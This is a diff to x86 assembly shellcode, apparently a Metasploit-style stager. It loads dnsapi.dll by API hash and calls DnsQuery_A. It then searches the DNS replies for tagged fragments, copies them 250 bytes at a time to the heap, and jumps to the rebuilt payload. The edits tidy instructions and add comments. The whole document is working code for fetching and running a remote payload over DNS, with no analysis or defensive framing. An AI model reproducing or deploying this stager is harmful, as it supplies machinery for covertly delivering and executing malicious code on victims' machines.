@@ -180,7 +180,6 @@ load_dnsapi:
 	mov ah,0x69
 	push eax        	; Push 'dnsapi' to the stack
 	push 0x61736e64        	; ...
-	mov esi, esp           	; Get a pointer to 'dnsapi'
 	push esp               	; Push a pointer to the 'dnsapi' string on the stack.
 	push 0x0726774C        	; kernel32.dll!LoadLibraryA
 	call ebp               	; LoadLibraryA( "dnsapi" )
@@ -194,12 +193,10 @@ get_dnsname_return:
 	pop ebx			;   (put ptr to ptr to stack on stack)
 	sub ebx,4
 	push ebx
-	xor esi,esi
-	push esi		; pReserved
+	push 0x0		; pReserved
 	push ebx		; ppQueryResultsSet
-	push esi		; pExtra
-	mov si,#{queryoptions}
-	push esi 		; Options
+	push 0x0		; pExtra
+	push #{queryoptions} 		; Options
 	push #{wType}		; wType
 	push eax		; lpstrName
 	push 0xC99CC96A 	; dnsapi.dll!DnsQuery_A
@@ -238,18 +235,18 @@ find_next_part:
 	inc eax			; set current tag
 	mov edi,edx		; start for search
 find_this_part:
-	sub edi,0x3
-	scasd
+	sub edi,0x3		; make sure we start at begin
+	scasd			; is this the tag we are looking for ?
 	jne find_this_part
 copy_piece_to_heap:
 	mov esi,edi		; set source
 	pop edi			; get target for copy
-	xor ecx,ecx
+	xor ecx,ecx		; clear ecx
 	mov cl,0xfa		; always copy 250 bytes, no matter what
 	rep movsb		; copy from ESI to EDI
 	push edi		; save target for next copy
-	dec ebx			; do we need another piece ?
-	cmp bl,0
+	dec ebx			; decrement counter
+	cmp bl,0		; are we done yet ?
 	je jump_to_payload	; nope
 	jmp find_next_part	; yes, find the next piece
 
